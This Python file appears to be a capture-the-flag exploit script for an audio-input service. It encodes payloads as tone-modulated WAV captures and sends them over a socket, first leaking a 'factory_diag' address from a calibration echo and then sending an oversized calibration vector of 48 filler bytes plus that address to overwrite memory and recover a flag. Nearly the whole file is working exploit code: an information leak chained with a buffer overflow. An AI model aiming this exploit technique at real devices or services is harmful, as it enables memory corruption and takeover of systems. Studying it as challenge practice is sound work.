import sys
import socket
import base64
import struct
import numpy as np

INPUT_SR = 96000
DECIM = 6
SYM_LEN = 200
SYM_LEAD = 64
TONE_BASE = 800.0
TONE_STEP = 80.0
CARRIER = 19000.0
AMP = 0.3

OP_SELECT_PROFILE = 0x01
OP_SET_CAL_VECTOR = 0x02
CAL_REGION = 0x0E


def build_frame(payload):
    L = len(payload)
    cs = L
    for b in payload:
        cs ^= b
    data = bytes([0xA5, 0x5A, L]) + bytes(payload) + bytes([cs & 0xFF])
    nibs = []
    for b in data:
        nibs.append((b >> 4) & 0xF)
        nibs.append(b & 0xF)
    return nibs


def synth_wav(payload):
    nibs = build_frame(payload)
    total_dec = SYM_LEAD + len(nibs) * SYM_LEN + SYM_LEAD
    total = total_dec * DECIM
    n = np.arange(total, dtype=np.float64)
    sym = (n // DECIM - SYM_LEAD) // SYM_LEN
    valid = (sym >= 0) & (sym < len(nibs))
    idx = np.clip(sym, 0, len(nibs) - 1).astype(np.int64)
    nibarr = np.array(nibs, dtype=np.float64)
    ctone = TONE_BASE + nibarr[idx] * TONE_STEP
    inst = np.where(valid, CARRIER + ctone, CARRIER)
    ph1 = 2.0 * np.pi * CARRIER * n / INPUT_SR
    ph2 = 2.0 * np.pi * np.cumsum(inst) / INPUT_SR
    x = AMP * np.cos(ph1) + np.where(valid, AMP * np.cos(ph2), 0.0)
    q = np.clip(np.round(x * 8388607.0), -8388608, 8388607).astype(np.int32)
    raw = bytearray()
    for v in q:
        raw += struct.pack('<i', int(v))[:3]
    data_bytes = bytes(raw)
    hdr = b'RIFF' + struct.pack('<I', 36 + len(data_bytes)) + b'WAVE'
    hdr += b'fmt ' + struct.pack('<IHHIIHH', 16, 1, 1, INPUT_SR, INPUT_SR * 3, 3, 24)
    hdr += b'data' + struct.pack('<I', len(data_bytes))
    return hdr + data_bytes


class Chan:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=30)
        self.buf = b''

    def read_block(self):
        while b'----\n' not in self.buf:
            chunk = self.s.recv(65536)
            if not chunk:
                break
            self.buf += chunk
        i = self.buf.find(b'----\n')
        if i < 0:
            out, self.buf = self.buf, b''
            return out.decode(errors='replace')
        out = self.buf[:i]
        self.buf = self.buf[i + 5:]
        return out.decode(errors='replace')

    def send_capture(self, payload):
        wav = synth_wav(payload)
        line = base64.b64encode(wav) + b'\n'
        self.s.sendall(line)
        return self.read_block()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
    ch = Chan(host, port)
    ch.read_block()

    r1 = ch.send_capture([OP_SELECT_PROFILE, 0x01, CAL_REGION])
    print(r1.strip())
    leak = None
    for ln in r1.splitlines():
        if 'CAL ECHO' in ln:
            hexpart = ln.split(':', 1)[1].strip()
            raw = bytes.fromhex(hexpart)
            leak = struct.unpack('<Q', raw[:8])[0]
    if not leak:
        print('no leak recovered')
        return 1
    print('leaked factory_diag = 0x%016x' % leak)

    filler = bytes([0x42] * 48)
    target = struct.pack('<Q', leak)
    values = filler + target
    count = len(values) // 2
    tlv = bytes([OP_SET_CAL_VECTOR, 1 + len(values), count]) + values
    r2 = ch.send_capture(list(tlv))
    print(r2.strip())
    for ln in r2.splitlines():
        if ln.startswith('FLAG:'):
            print('RECOVERED', ln.split(':', 1)[1].strip())
            return 0
    print('exploit did not land')
    return 1


if __name__ == '__main__':
    sys.exit(main())
